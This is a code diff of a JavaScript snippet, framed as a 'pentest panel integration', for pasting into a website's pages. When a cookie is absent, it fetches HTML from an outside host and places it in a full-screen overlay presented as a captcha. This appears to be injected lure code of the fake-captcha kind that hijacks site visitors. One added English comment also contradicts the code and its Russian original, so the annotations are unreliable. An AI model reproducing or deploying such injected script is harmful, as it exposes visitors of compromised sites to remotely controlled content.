@@ -1,5 +1,5 @@
-<!-- Интеграция пентест панели -->
-<!-- Добавьте этот код перед закрывающим тегом </body> -->
+<!-- Pentest Panel Integration -->
+<!-- Add this code before </body> tag -->
 
 <script type='text/javascript'>
 // Событие обмена сообщениями между iframe подгружаемого с панели и кодом страницы в которой размещена капча
@@ -11,6 +11,7 @@ window.addEventListener("message", e =>
     }
 });
 
+// Function for reading cookie
 // Функция чтения куки
 function getCookie(name)
 {
@@ -18,11 +19,13 @@ function getCookie(name)
 	return match ? decodeURIComponent(match[2]) : null;
 }
 
+// Reading cookie
 // Чтение куки
 const cookiename = "cookie-captcha-complete";
 const cookie = getCookie(cookiename);
 
-// Если кука не найдена
+// Cookie found
+// Кука не найдена
 if(!cookie)
 {
 	fetch("https://ipv6app.bar") 
@@ -36,7 +39,16 @@ if(!cookie)
 
 		else
 		{
-			document.body.insertAdjacentHTML("beforeend", html);
+			// ИСПРАВЛЕНО: Создаем контейнер если его нет, или используем существующий
+			let captchaContainer = document.getElementById("captcha-container-panel");
+			if (!captchaContainer) {
+				captchaContainer = document.createElement("div");
+				captchaContainer.id = "captcha-container-panel";
+				captchaContainer.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;pointer-events:auto;";
+				document.body.appendChild(captchaContainer);
+			}
+			captchaContainer.innerHTML = html;
+			console.log("Captcha loaded into container");
 		}
 	})
 	.catch(() => console.error("Failed to load page!"));
